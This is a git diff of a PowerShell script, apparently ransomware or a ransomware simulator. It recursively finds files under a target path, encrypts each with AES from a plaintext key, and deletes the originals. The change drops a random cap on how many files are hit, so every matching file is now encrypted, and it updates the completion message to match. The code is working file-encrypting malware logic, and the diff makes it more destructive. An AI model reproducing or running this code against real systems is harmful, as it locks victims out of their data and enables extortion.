@@ -54,10 +54,7 @@ Import-Module "$PSScriptRoot\FileCryptography.psm1"
 
 if ($mode -eq "encrypt") {
     #find files to encrypt
-    $FileList = get-childitem -path $TargetPath\* -Include $TargetFiles -Recurse -force | where { ! $_.PSIsContainer }
-    #Select a random subset of files discovered to encrypt
-    $FileCount = Get-Random -Minimum 1000 -Maximum 4500
-    $FilestoEncrypt = Get-Random -InputObject $FileList -Count $FileCount
+    $FilestoEncrypt = get-childitem -path $TargetPath\* -Include $TargetFiles -Recurse -force | where { ! $_.PSIsContainer }
 
     #encrypt each file
 
@@ -66,7 +63,7 @@ if ($mode -eq "encrypt") {
         Write-Host "Encrypting $file"
         Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $EncExtension -RemoveSource
     }
-    Write-Host "Encrypted $FileCount files." | Start-Sleep -Seconds 10
+    Write-Host "Encrypted all files." | Start-Sleep -Seconds 10
 }
 
 elseif ($mode -eq "decrypt") {
